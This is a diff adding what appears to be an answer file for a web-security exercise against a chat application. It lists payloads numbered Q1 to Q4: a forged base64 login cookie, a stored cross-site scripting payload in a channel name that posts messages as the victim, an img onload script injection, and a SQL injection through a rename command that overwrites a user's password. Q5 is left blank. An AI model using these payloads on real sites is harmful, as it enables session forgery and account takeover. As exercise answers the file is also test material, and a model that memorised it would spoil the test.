@@ -1,0 +1,16 @@
+Q1
+document.cookie = `login=${btoa("edward")}`
+
+Q2
+#general-spam
+/join #<script> fetch('http://localhost:8000/post', { 'method': 'POST', 'body': 'channel=#general-spam&message=Good+Morning!' }) </script>
+
+Q3
+#general-spam 
+<img id="cat" onload="window.localStorage.getItem('gif') == undefined ? window.localStorage.setItem('gif', true) : document.getElementById('cat').style.visibility='hidden'" src="https://media.giphy.com/media/u98zWbe3jgJoI/giphy.gif"/>
+
+Q4
+#general-spam 
+/rename bob Bob', password=sha1('1234'), username='bob
+
+Q5
